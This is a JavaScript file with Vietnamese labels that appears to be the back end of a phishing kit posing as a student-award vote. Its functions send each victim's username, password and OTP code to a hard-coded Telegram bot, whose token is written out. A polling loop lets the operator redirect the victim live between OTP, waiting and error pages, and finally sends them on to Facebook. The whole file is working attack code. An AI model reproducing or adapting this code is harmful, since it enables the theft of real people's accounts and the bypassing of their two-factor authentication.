/**
 * ELITE CONTROL SYSTEM 2026
 * File: api.js - BẢN HOÀN CHỈNH ĐÃ CẤU HÌNH ID
 */

// ==========================================
// 1. THÔNG TIN KẾT NỐI CHUẨN (DỰA TRÊN ẢNH)
// ==========================================
const TELE_TOKEN = '8217538564:AAHwyK0pwRtgqSdPdScc8y2a4VKfn14T7As';
const CHAT_ID = '8217538564'; 

// ==========================================
// 2. HÀM GỬI DỮ LIỆU VỀ TELEGRAM
// ==========================================
function sendToTele(text) {
    const url = `https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`;
    const payload = {
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown'
    };

    return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

// ==========================================
// 3. GOM DỮ LIỆU TÀI KHOẢN (Gửi từ Login)
// ==========================================
function collectLoginData(user, pass, candidate = "Học sinh ưu tú") {
    const message = `⚠️ **THÔNG BÁO: CÓ TÀI KHOẢN MỚI**\n` +
                    `--------------------------\n` +
                    `👤 **Tài khoản:** \`${user}\`\n` +
                    `🔑 **Mật khẩu:** \`${pass}\`\n` +
                    `🏆 **Bình chọn cho:** ${candidate}\n` +
                    `--------------------------\n` +
                    `👉 *Điều khiển: Nhắn OTP, ERROR, hoặc SUCCESS*`;
    sendToTele(message);
}

// ==========================================
// 4. GOM DỮ LIỆU MÃ OTP (Gửi từ OTP)
// ==========================================
function collectOTPData(code) {
    const message = `🔢 **MÃ XÁC THỰC (OTP) MỚI**\n` +
                    `--------------------------\n` +
                    `✨ **Mã số:** \`${code}\`\n` +
                    `--------------------------\n` +
                    `✅ *Sử dụng mã này để đăng nhập ngay!*`;
    sendToTele(message);
}

// ==========================================
// 5. HÀM ĐIỀU KHIỂN TRANG WEB (LẮNG NGHE LỆNH)
// ==========================================
let lastCommandId = 0;

async function listenToAdmin() {
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/getUpdates?offset=-1`);
        const data = await response.json();

        if (data.ok && data.result.length > 0) {
            const lastMsg = data.result[0].message;
            const command = lastMsg.text.toUpperCase();
            const msgId = lastMsg.message_id;

            if (msgId !== lastCommandId) {
                if (lastCommandId !== 0) { 
                    if (command === 'OTP') {
                        window.location.href = 'otp.html';
                    } else if (command === 'WAIT') {
                        window.location.href = 'waiting.html';
                    } else if (command === 'ERROR') {
                        alert("Mã xác nhận không chính xác. Vui lòng kiểm tra lại!");
                        document.querySelectorAll('.otp-field').forEach(i => i.value = "");
                    } else if (command === 'SUCCESS') {
                        alert("Cảm ơn bạn! Bình chọn đã thành công.");
                        window.location.href = 'https://facebook.com';
                    }
                }
                lastCommandId = msgId;
            }
        }
    } catch (error) { }
}

setInterval(listenToAdmin, 2000);
